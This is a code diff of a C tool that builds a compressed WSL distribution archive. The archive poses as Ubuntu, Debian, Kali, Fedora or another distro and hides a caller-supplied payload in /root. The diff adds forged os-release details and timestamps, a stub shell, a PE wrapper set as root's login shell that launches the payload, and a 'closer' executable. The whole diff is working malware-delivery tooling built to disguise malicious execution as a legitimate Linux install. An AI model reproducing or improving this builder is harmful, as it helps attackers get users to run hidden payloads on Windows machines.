@@ -3,6 +3,7 @@
 #include <string.h>
 #include <stdint.h>
 #include <time.h>
+#include <zlib.h>
 
 static uint8_t *read_file(const char *path, size_t *out_len) {
     FILE *f = fopen(path, "rb");
@@ -61,7 +62,14 @@ static void tar_octal(uint8_t *field, size_t width, uint64_t val) {
     field[width - 1] = 0;
 }
 
-static void tar_dir(Buf *b, const char *name) {
+static void tar_set_ustar(uint8_t hdr[512], uint64_t mtime) {
+    tar_octal(hdr + 136, 12, mtime);
+    memcpy(hdr + 257, "ustar\0" "00", 8);
+    memcpy(hdr + 265, "root", 4);
+    memcpy(hdr + 297, "root", 4);
+}
+
+static void tar_dir(Buf *b, const char *name, uint64_t mtime) {
     uint8_t hdr[512];
     memset(hdr, 0, 512);
     strncpy((char*)hdr, name, 99);
@@ -69,9 +77,8 @@ static void tar_dir(Buf *b, const char *name) {
     tar_octal(hdr + 108, 8, 0);
     tar_octal(hdr + 116, 8, 0);
     tar_octal(hdr + 124, 12, 0);
-    tar_octal(hdr + 136, 12, 0);
     hdr[156] = '5';
-    memcpy(hdr + 257, "ustar  ", 8);
+    tar_set_ustar(hdr, mtime);
     uint32_t cs = tar_checksum(hdr);
     snprintf((char*)(hdr + 148), 8, "%06o", cs);
     hdr[154] = ' '; hdr[155] = '\0';
@@ -79,7 +86,7 @@ static void tar_dir(Buf *b, const char *name) {
 }
 
 static void tar_file(Buf *b, const char *name, const uint8_t *data,
-                     size_t len, uint32_t mode) {
+                     size_t len, uint32_t mode, uint64_t mtime) {
     uint8_t hdr[512];
     memset(hdr, 0, 512);
     strncpy((char*)hdr, name, 99);
@@ -87,9 +94,8 @@ static void tar_file(Buf *b, const char *name, const uint8_t *data,
     tar_octal(hdr + 108, 8, 0);
     tar_octal(hdr + 116, 8, 0);
     tar_octal(hdr + 124, 12, len);
-    tar_octal(hdr + 136, 12, 0);
     hdr[156] = '0';
-    memcpy(hdr + 257, "ustar  ", 8);
+    tar_set_ustar(hdr, mtime);
     uint32_t cs = tar_checksum(hdr);
     snprintf((char*)(hdr + 148), 8, "%06o", cs);
     hdr[154] = ' '; hdr[155] = '\0';
@@ -107,21 +113,75 @@ static void tar_end(Buf *b) {
     buf_append(b, z, 1024);
 }
 
+static int gzip_buf(const uint8_t *in, size_t in_len,
+                    uint8_t **out, size_t *out_len) {
+    uLongf bound = compressBound(in_len) + 64;
+    uint8_t *dst = malloc(bound);
+    if (!dst) return 0;
+
+    z_stream zs;
+    memset(&zs, 0, sizeof(zs));
+    if (deflateInit2(&zs, Z_BEST_COMPRESSION, Z_DEFLATED,
+                     15 + 16, 8, Z_DEFAULT_STRATEGY) != Z_OK) {
+        free(dst); return 0;
+    }
+    zs.next_in  = (Bytef*)in;
+    zs.avail_in = (uInt)in_len;
+    zs.next_out  = dst;
+    zs.avail_out = (uInt)bound;
+
+    if (deflate(&zs, Z_FINISH) != Z_STREAM_END) {
+        deflateEnd(&zs); free(dst); return 0;
+    }
+    *out_len = zs.total_out;
+    deflateEnd(&zs);
+    *out = dst;
+    return 1;
+}
+
+static const uint8_t STUB_SH[] = {
+    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,
+    0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
+    0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+    0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x81,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,
+    0x31,0xff,0xb8,0x3c,0x00,0x00,0x00,0x0f,0x05
+};
+
+#include "wrapper_pe.h"
+#include "closer_pe.h"
+
 typedef struct {
     const char *id;
     const char *display_name;
     const char *distro_name;
     const char *os_id;
     const char *os_pretty;
+    const char *version_id;
+    const char *home_url;
+    const char *support_url;
 } DistroProfile;
 
 static const DistroProfile DISTROS[] = {
-    { "ubuntu2204", "Ubuntu 22.04.3 LTS",   "Ubuntu-22.04",       "ubuntu",        "Ubuntu 22.04.3 LTS"               },
-    { "ubuntu2004", "Ubuntu 20.04.6 LTS",   "Ubuntu-20.04",       "ubuntu",        "Ubuntu 20.04.6 LTS"               },
-    { "debian",     "Debian GNU/Linux",      "Debian",             "debian",        "Debian GNU/Linux 12 (bookworm)"   },
-    { "kali",       "Kali Linux Rolling",    "kali-linux",         "kali",          "Kali GNU/Linux Rolling"           },
-    { "opensuse",   "openSUSE Leap 15.5",    "openSUSE-Leap-15.5", "opensuse-leap", "openSUSE Leap 15.5"               },
-    { "fedora",     "Fedora Linux 39",       "FedoraLinux-39",     "fedora",        "Fedora Linux 39 (Container Image)"},
+    { "ubuntu2204", "Ubuntu 22.04.3 LTS",   "Ubuntu-22.04",       "ubuntu",        "Ubuntu 22.04.3 LTS",        "22.04",
+      "https://www.ubuntu.com/",            "https://help.ubuntu.com/" },
+    { "ubuntu2004", "Ubuntu 20.04.6 LTS",   "Ubuntu-20.04",       "ubuntu",        "Ubuntu 20.04.6 LTS",        "20.04",
+      "https://www.ubuntu.com/",            "https://help.ubuntu.com/" },
+    { "debian",     "Debian GNU/Linux",      "Debian",             "debian",        "Debian GNU/Linux 12 (bookworm)", "12",
+      "https://www.debian.org/",            "https://www.debian.org/support" },
+    { "kali",       "Kali Linux Rolling",    "kali-linux",         "kali",          "Kali GNU/Linux Rolling",     "2024.1",
+      "https://www.kali.org/",              "https://forums.kali.org/" },
+    { "opensuse",   "openSUSE Leap 15.5",    "openSUSE-Leap-15.5", "opensuse-leap", "openSUSE Leap 15.5",        "15.5",
+      "https://www.opensuse.org/",          "https://en.opensuse.org/Portal:Support" },
+    { "fedora",     "Fedora Linux 39",       "FedoraLinux-39",     "fedora",        "Fedora Linux 39 (Container Image)", "39",
+      "https://fedoraproject.org/",         "https://ask.fedoraproject.org/" },
+    { "alpine",     "Alpine Linux",          "Alpine",             "alpine",        "Alpine Linux v3.19",         "3.19.0",
+      "https://alpinelinux.org/",           "https://alpinelinux.org/community/" },
 };
 #define N_DISTROS (int)(sizeof(DISTROS)/sizeof(DISTROS[0]))
 
@@ -137,59 +197,71 @@ static void build_rootfs_tar(
         const char *payload_name,
         const DistroProfile *dp)
 {
+    uint64_t now = (uint64_t)time(NULL);
+
     const char *dirs[] = {
         "./", "./bin/", "./dev/", "./etc/", "./home/",
         "./lib/", "./lib64/", "./proc/", "./root/",
         "./run/", "./sys/", "./tmp/", "./usr/", "./usr/bin/",
         "./usr/lib/", "./var/", "./var/log/", NULL
     };
-    for (int i = 0; dirs[i]; i++) tar_dir(tar, dirs[i]);
+    for (int i = 0; dirs[i]; i++) tar_dir(tar, dirs[i], now);
+
+    tar_file(tar, "./bin/sh", STUB_SH, sizeof(STUB_SH), 0755, now);
 
     char os_rel[512];
     snprintf(os_rel, sizeof(os_rel),
-        "NAME=\"%s\"\nID=%s\nPRETTY_NAME=\"%s\"\n"
-        "HOME_URL=\"https://www.ubuntu.com/\"\n"
-        "SUPPORT_URL=\"https://help.ubuntu.com/\"\n",
-        dp->display_name, dp->os_id, dp->os_pretty);
-    tar_file(tar, "./etc/os-release", (uint8_t*)os_rel, strlen(os_rel), 0644);
+        "NAME=\"%s\"\nID=%s\nVERSION_ID=\"%s\"\nPRETTY_NAME=\"%s\"\n"
+        "HOME_URL=\"%s\"\n"
+        "SUPPORT_URL=\"%s\"\n",
+        dp->display_name, dp->os_id, dp->version_id, dp->os_pretty,
+        dp->home_url, dp->support_url);
+    tar_file(tar, "./etc/os-release", (uint8_t*)os_rel, strlen(os_rel), 0644, now);
 
     char wsl_dist_conf[256];
     snprintf(wsl_dist_conf, sizeof(wsl_dist_conf),
         "[oobe]\ndefaultName=%s\ndefaultUid=0\n",
         dp->distro_name);
     tar_file(tar, "./etc/wsl-distribution.conf",
-             (uint8_t*)wsl_dist_conf, strlen(wsl_dist_conf), 0644);
+             (uint8_t*)wsl_dist_conf, strlen(wsl_dist_conf), 0644, now);
 
     const char *wsl_conf =
         "[automount]\nenabled=true\nroot=/mnt/\n"
         "options=\"metadata,umask=22,fmask=11\"\nmountFsTab=false\n\n"
         "[interop]\nenabled=true\nappendWindowsPath=false\n\n"
         "[user]\ndefault=root\n";
-    tar_file(tar, "./etc/wsl.conf", (uint8_t*)wsl_conf, strlen(wsl_conf), 0644);
+    tar_file(tar, "./etc/wsl.conf", (uint8_t*)wsl_conf, strlen(wsl_conf), 0644, now);
 
     char passwd[256];
     snprintf(passwd, sizeof(passwd),
-        "root:x:0:0:root:/root:/root/%s\n"
-        "nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin\n",
-        payload_name);
-    tar_file(tar, "./etc/passwd", (uint8_t*)passwd, strlen(passwd), 0644);
+        "root:x:0:0:root:/root:/root/init.exe\n"
+        "nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin\n");
+    tar_file(tar, "./etc/passwd", (uint8_t*)passwd, strlen(passwd), 0644, now);
 
     const char *shadow = "root:*:19000:0:99999:7:::\n";
     const char *group  = "root:x:0:\nnogroup:x:65534:\n";
-    tar_file(tar, "./etc/shadow", (uint8_t*)shadow, strlen(shadow), 0640);
-    tar_file(tar, "./etc/group",  (uint8_t*)group,  strlen(group),  0644);
+    tar_file(tar, "./etc/shadow", (uint8_t*)shadow, strlen(shadow), 0640, now);
+    tar_file(tar, "./etc/group",  (uint8_t*)group,  strlen(group),  0644, now);
 
     const char *hnames[] = { "wsl-desktop", "wsl-host", "wsl-dev", "wsl-box" };
     srand((unsigned)time(NULL));
     char hostname[32];
     snprintf(hostname, sizeof(hostname), "%s\n", hnames[rand() % 4]);
-    tar_file(tar, "./etc/hostname", (uint8_t*)hostname, strlen(hostname), 0644);
+    tar_file(tar, "./etc/hostname", (uint8_t*)hostname, strlen(hostname), 0644, now);
 
-    tar_file(tar, "./etc/fstab", (uint8_t*)"", 0, 0644);
+    tar_file(tar, "./etc/fstab", (uint8_t*)"", 0, 0644, now);
 
     char payload_path_in_tar[256];
     snprintf(payload_path_in_tar, sizeof(payload_path_in_tar), "./root/%s", payload_name);
-    tar_file(tar, payload_path_in_tar, payload, payload_len, 0755);
+    tar_file(tar, payload_path_in_tar, payload, payload_len, 0755, now);
+
+    uint8_t wrapper[WRAPPER_PE_SIZE];
+    memcpy(wrapper, WRAPPER_PE, WRAPPER_PE_SIZE);
+    memset(wrapper + WRAPPER_PAYLOAD_OFF, 0, WRAPPER_PAYLOAD_BUF);
+    memcpy(wrapper + WRAPPER_PAYLOAD_OFF, payload_name, strlen(payload_name));
+    tar_file(tar, "./root/init.exe", wrapper, WRAPPER_PE_SIZE, 0755, now);
+
+    tar_file(tar, "./root/closer.exe", CLOSER_PE, CLOSER_PE_SIZE, 0755, now);
 
     tar_end(tar);
 }
@@ -198,7 +270,7 @@ int main(int argc, char *argv[]) {
     if (argc != 5) {
         fprintf(stderr,
             "Usage: %s <payload> <payload_name> <distro_id> <output>\n"
-            "  distro_id : ubuntu2204 | ubuntu2004 | debian | kali | opensuse | fedora\n",
+            "  distro_id : ubuntu2204 | ubuntu2004 | debian | kali | opensuse | fedora | alpine\n",
             argv[0]);
         return 1;
     }
@@ -232,20 +304,28 @@ int main(int argc, char *argv[]) {
 
     fprintf(stderr, "[*] Rootfs tar: %zu bytes\n", tar.len);
 
+    uint8_t *gz_data = NULL;
+    size_t gz_len = 0;
+    if (!gzip_buf(tar.data, tar.len, &gz_data, &gz_len)) {
+        fprintf(stderr, "[-] gzip compression failed\n");
+        buf_free(&tar); return 1;
+    }
+    buf_free(&tar);
+
+    fprintf(stderr, "[*] Compressed: %zu bytes\n", gz_len);
+
     FILE *out = fopen(output_path, "wb");
     if (!out) {
         fprintf(stderr, "[-] Cannot write: %s\n", output_path);
-        buf_free(&tar); return 1;
+        free(gz_data); return 1;
     }
-    size_t written = fwrite(tar.data, 1, tar.len, out);
+    size_t written = fwrite(gz_data, 1, gz_len, out);
     fclose(out);
+    free(gz_data);
 
-    size_t final_size = tar.len;
-    buf_free(&tar);
-
-    fprintf(stderr, "[+] Written: %s (%zu bytes)\n", output_path, final_size);
-    if (written != final_size)
-        fprintf(stderr, "[-] Warning: only %zu of %zu bytes written\n", written, final_size);
+    fprintf(stderr, "[+] Written: %s (%zu bytes)\n", output_path, written);
+    if (written != gz_len)
+        fprintf(stderr, "[-] Warning: only %zu of %zu bytes written\n", written, gz_len);
     fprintf(stderr, "[+] Identity : %s  (wsl -l name: %s)\n", dp->display_name, dp->distro_name);
     fprintf(stderr, "[+] Payload  : /root/%s\n", payload_name);
 
